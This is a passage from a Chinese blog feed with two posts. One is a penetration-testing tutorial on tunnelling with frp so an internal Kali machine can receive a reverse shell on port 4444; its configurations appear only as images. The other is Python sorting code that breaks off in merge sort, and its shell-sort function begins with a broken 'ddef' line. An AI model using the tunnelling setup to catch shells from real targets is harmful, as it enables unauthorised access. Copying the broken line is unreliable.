      <content type="html"><![CDATA[<blockquote class="blockquote-center">总有一段路，需要一个人走，那就一个人，勇敢的走完</blockquote><p><img src="/images/frp实现内网穿透-内网kali接收反弹shell-1.png" alt=""></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>公网没有kali主机，且kali处于多层内网，而且不能控制路由器添加端口映射，kali该如何接收反弹式shell?可以使用内网穿透工具，下面使用frp演示.</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>kali机</li><li>外网服务器</li><li><a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">根据自己的操作系统选择frp</a></li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>服务器配置:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-2.png" alt=""><br>服务器运行:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-3.png" alt=""></p><p>kali配置:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-4.png" alt=""><br>kali运行:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-5.png" alt=""></p><p>看服务端控制台输出:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-6.png" alt="">kali连接到了服务端，服务端监听了4444端口，这样访问服务端就能访问到kali了。</p><p><strong>注:[kali]的配置type=tcp是因为下面的payload使用的是reverse_tcp</strong><br><strong>注:上面的配置不安全，详细配置请看<a href="https://github.com/fatedier/frp/blob/master/conf/frps_full.ini" target="_blank" rel="noopener">https://github.com/fatedier/frp/blob/master/conf/frps_full.ini</a></strong></p><h2 id="攻击验证frp有效性"><a href="#攻击验证frp有效性" class="headerlink" title="攻击验证frp有效性"></a>攻击验证frp有效性</h2><p>攻击环境:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-1.png" alt=""></p><p>kali上运行:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-7.png" alt=""><br>监听4444端口</p><p>目标机通过上图红色线反弹shell给kali：<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-8.png" alt=""><br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-9.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python实现八大排序</title>
      <link href="/python%E5%AE%9E%E7%8E%B0%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">世界这么大,该往哪走?</blockquote><blockquote><p>python实现八大排序</p></blockquote><a id="more"></a><h2 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h2><p>算法基本思想:</p><ul><li>直接插入排序(Straight Insertion Sort)的基本思想是：把n个待排序的元素看成为一个有序表和一个无序表。开始时有序表中只包含1个元素，无序表中包含有n-1个元素，排序过程中每次从无序表中取出第一个元素，将它插入到有序表中的适当位置，使之成为新的有序表，重复n-1次可完成排序过程。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_sort</span><span class="params">(iterable, reverse=False)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    对可迭代对象进行插入排序</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">        iterable: 可迭代对象</span></span><br><span class="line"><span class="string">        reversed: False默认从小到大排序。True从大到小</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i, _ <span class="keyword">in</span> enumerate(iterable):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> iterable[j] &lt; iterable[j - <span class="number">1</span>]:</span><br><span class="line">                iterable[j], iterable[j - <span class="number">1</span>] = iterable[j - <span class="number">1</span>], iterable[j]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    insert_sort(lst1)</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    insert_sort(lst2)</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    insert_sort(lst3)</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    insert_sort(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><p>算法基本思想:</p><ul><li>　希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">ddef shell_insert(iterable, start, end, step):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start, end, step):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, start, -step):</span><br><span class="line">            <span class="keyword">if</span> iterable[j] &lt; iterable[j - step]:</span><br><span class="line">                iterable[j], iterable[j -</span><br><span class="line">                                      step] = iterable[j - step], iterable[j]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell_sort</span><span class="params">(iterable, reverse=False)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    对可迭代对象进行希尔排序</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">        iterable: 可迭代对象</span></span><br><span class="line"><span class="string">        reversed: False默认从小到大排序。True从大到小</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    length = len(iterable)</span><br><span class="line">    gap = length // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> gap != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> start <span class="keyword">in</span> range(gap + <span class="number">1</span>):</span><br><span class="line">            shell_insert(iterable, start, length, gap)</span><br><span class="line">        gap = gap // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    shell_sort(lst1)</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    shell_sort(lst2)</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    shell_sort(lst3)</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    shell_sort(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="直接选择排序"><a href="#直接选择排序" class="headerlink" title="直接选择排序"></a>直接选择排序</h2><p>算法基本思想:</p><ul><li>与直接插入排序一样，分为有序区和无序区，所不同的是直接播放排序是将无序区的第一个元素直接插入到有序区以形成一个更大的有序区，而直接选择排序是从无序区选一个最小的元素直接放到有序区的最后。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_sort</span><span class="params">(iterable, reverse=False)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    对可迭代对象进行直接选择排序</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">        iterable: 可迭代对象</span></span><br><span class="line"><span class="string">        reversed: False默认从小到大排序。True从大到小</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    length = len(iterable)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        min_x = iterable[i]</span><br><span class="line">        flag_x = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, length):</span><br><span class="line">            <span class="keyword">if</span> iterable[j] &lt; min_x:</span><br><span class="line">                min_x = iterable[j]</span><br><span class="line">                flag_x = j</span><br><span class="line"></span><br><span class="line">        iterable[i], iterable[flag_x] = iterable[flag_x], iterable[i]</span><br><span class="line">        print(iterable)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    select_sort(lst1)</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    select_sort(lst2)</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    select_sort(lst3)</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    select_sort(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><p>算法基本思想(大顶堆为例):</p><ul><li>先将初始排列关键字序列(R1,R2…,Rn-1,Rn)构成大顶堆，此堆为初始的无序区.(这里是从最后一个非叶结点向前进行赛选)</li><li>将堆顶元素R1与最后一个元素Rn交换，此时得到新的无序区(R1,R2…,Rn-1)和新的有序区(Rn)，并且Rn大于无序区所有数，此后还有n-1个数；</li><li>由于交换后新的堆顶R1可能违反堆的性质，因此需要对当前无序区(R1,R2…,Rn-1)调整为新堆(将堆顶元素向下调整使其保持大顶堆的性质，输出堆顶元素)，此后还剩余n-2个数；</li><li>重读以上算法，直到堆中仅剩一个元素为止.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeapSort</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    堆排序</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    set() 方法设置可迭代对象以及排列顺序</span></span><br><span class="line"><span class="string">    _sift_down() 进行向下调整堆</span></span><br><span class="line"><span class="string">    _create_heap() 创建初始堆</span></span><br><span class="line"><span class="string">    heap_sort() 进行堆排序</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, iterable, reverse=False)</span>:</span></span><br><span class="line">        self.iterable = iterable</span><br><span class="line">        self.reverse = reverse</span><br><span class="line">        self.length = len(iterable)</span><br><span class="line"></span><br><span class="line">        self.iterable.insert(<span class="number">0</span>, <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_sift_down</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        left_child, right_child = index * <span class="number">2</span>, index * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left_child &gt; self.cur_len:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        max_child = left_child</span><br><span class="line">        <span class="keyword">if</span> (right_child &lt;= self.cur_len) <span class="keyword">and</span> (self.iterable[left_child] &lt; self.iterable[right_child]):</span><br><span class="line">            max_child = right_child</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.iterable[index] &lt; self.iterable[max_child]:</span><br><span class="line">            self.iterable[index], self.iterable[max_child] = self.iterable[max_child], self.iterable[index]</span><br><span class="line">            self._sift_down(max_child)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_heap</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.length // <span class="number">2</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">            self._sift_down(i)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">heap_sort</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># cur_len表示还没有顺序区域的长度</span></span><br><span class="line">        self.cur_len = self.length</span><br><span class="line">        self._create_heap()</span><br><span class="line">        <span class="keyword">while</span> self.cur_len:</span><br><span class="line">            <span class="comment"># print(self.iterable)</span></span><br><span class="line">            self.iterable[<span class="number">1</span>], self.iterable[self.cur_len] = self.iterable[self.cur_len], self.iterable[<span class="number">1</span>]</span><br><span class="line">            self.cur_len -= <span class="number">1</span></span><br><span class="line">            self._sift_down(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.iterable.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> self.reverse:</span><br><span class="line">            self.iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line"></span><br><span class="line">    heap_sort = HeapSort()</span><br><span class="line"></span><br><span class="line">    heap_sort.set(lst1)</span><br><span class="line">    heap_sort.heap_sort()</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    heap_sort.set(lst2)</span><br><span class="line">    heap_sort.heap_sort()</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    heap_sort.set(lst3)</span><br><span class="line">    heap_sort.heap_sort()</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    heap_sort.set(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    heap_sort.heap_sort()</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>算法基本思想:</p><ul><li>从无序序列头部开始，进行两两比较，根据大小交换位置，直到最后将最大（小）的数据元素交换到了无序队列的队尾，从而成为有序序列的一部分；下一次继续这个过程，直到所有数据元素都排好序。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort</span><span class="params">(iterable, reverse=False)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    冒泡排序</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">        iterable: 可迭代对象</span></span><br><span class="line"><span class="string">        reversed: False默认从小到大排序。True从大到小</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    length = len(iterable)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># flag标记本次是否交换了数据,如果没交换数据就不用继续排了</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> iterable[j] &gt; iterable[j + <span class="number">1</span>]:</span><br><span class="line">                iterable[j], iterable[j + <span class="number">1</span>] = iterable[j + <span class="number">1</span>], iterable[j]</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    bubble_sort(lst1)</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    bubble_sort(lst2)</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    bubble_sort(lst3)</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    bubble_sort(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p>算法基本思想(分治思想):</p><ul><li>在数据集之中，找一个基准点(以下代码以最left为基准点)</li><li>以基准点为中心将数据分为左边比基准点小,右边大于等于基准点</li><li>在递归左右两边</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    快速排序</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    set() 设置可迭代对象及排序方式(大-&gt;小 or 小-&gt;大)</span></span><br><span class="line"><span class="string">    place_it() 每次选择最左边的作为参考,这个方法调用后左边的元素都小于它，右边的元素大于等于它,返回参考元素最终的位置</span></span><br><span class="line"><span class="string">    sort() 递归左右两边</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, iterable, reverse=False)</span>:</span></span><br><span class="line">        self.iterable = iterable</span><br><span class="line">        self.reverse = reverse</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">place_it</span><span class="params">(self, left, right)</span>:</span></span><br><span class="line">        chose_it = left</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            <span class="keyword">while</span> left &lt; right:</span><br><span class="line">                <span class="keyword">if</span> self.iterable[right] &lt; self.iterable[chose_it]:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> left &lt; right:</span><br><span class="line">                <span class="keyword">if</span> self.iterable[left] &gt; self.iterable[chose_it]:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            self.iterable[left], self.iterable[right] = self.iterable[right], self.iterable[left]</span><br><span class="line">        self.iterable[left], self.iterable[chose_it] = self.iterable[chose_it], self.iterable[left]</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sort</span><span class="params">(self, left, right)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> left &gt;= right:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        index = self.place_it(left, right)</span><br><span class="line">        <span class="comment"># print(self.iterable)</span></span><br><span class="line">        self.sort(left, index - <span class="number">1</span>)</span><br><span class="line">        self.sort(index + <span class="number">1</span>, right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sort(<span class="number">0</span>, len(self.iterable) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> self.reverse:</span><br><span class="line">            self.iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>, <span class="number">8</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">20</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    quick_sort = QuickSort()</span><br><span class="line"></span><br><span class="line">    quick_sort.set(lst1)</span><br><span class="line">    quick_sort.quick_sort()</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    quick_sort.set(lst2)</span><br><span class="line">    quick_sort.quick_sort()</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    quick_sort.set(lst3)</span><br><span class="line">    quick_sort.quick_sort()</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    quick_sort.set(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    quick_sort.quick_sort()</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p>算法基本思想(分治思想):</p><ul><li>归并排序首先将待排序数组或线性表分为两个有序数组或线性表</li><li>将两个有序数组或线性表合并成一个有序数组或线性表.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 